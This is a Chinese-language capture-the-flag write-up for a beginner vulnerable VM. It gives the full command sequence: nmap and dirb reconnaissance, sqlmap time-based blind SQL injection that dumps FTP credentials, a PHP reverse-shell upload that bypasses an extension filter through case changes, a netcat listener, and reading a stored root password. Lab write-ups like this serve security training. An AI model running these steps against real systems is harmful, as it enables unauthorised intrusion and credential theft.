虚拟机简介：一个复杂的Web应用程序，几乎没有高级漏洞。提示：PHP $ _REQUEST

目标：1个flag

级别：初级

1、主机探测

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.171
查看开放21、80端口

3、WEB渗透测试

3.1 使用dirb搜索PHP页面发现一个library.php

dirb http://192.168.207.171 -X .php

3.2 访问页面后发现参数可以控制，截取数据包导入到sqlmap中未成功

3.3 根据作者提示，修改请求方式为POST，响应码为200


3.4 使用sqlmap进行爆破测试

保存文件为request.txt文件

检测到有基于时间的盲注

sqlmap -r request.txt --risk 3 --level 5 --batch

3.5 获取数据库信息

sqlmap -r request.txt --risk 3 --level 5 --dbs --batch
得到数据信息

sqlmap -r request.txt --risk 3 --level 5 -D library --tables  --batch


得到数据库的表

sqlmap -r request.txt --risk 3 --level 5 -D library -T access --columns  --batch 

得到数据库表中列信息

sqlmap -r request.txt --risk 3 --level 5 -D library -T access --dump --batch

得到ftp的用户名密码

3.6 连接ftp并上传反弹shell

ftp 192.168.207.171cd htmlput shell.php

禁止上传php文件

3.7 修改文件后缀大小写

mv shell.php shell.PHPput shell.PHPchmod 777 shell.PHP

3.8 开启NC监听反弹shell

nc -nlvp 4444

访问页面

http://192.168.207.171/shell.PHP

3.9 使用python优化脚本

python -c 'import pty; pty.spawn("/bin/sh")'

4、系统提权

4.1 在/var/mail/目录中查看到welcome文件中保存root密码

cd /var/mail/ls -lahcat welcome

4.2 使用得到密码切换为root账号
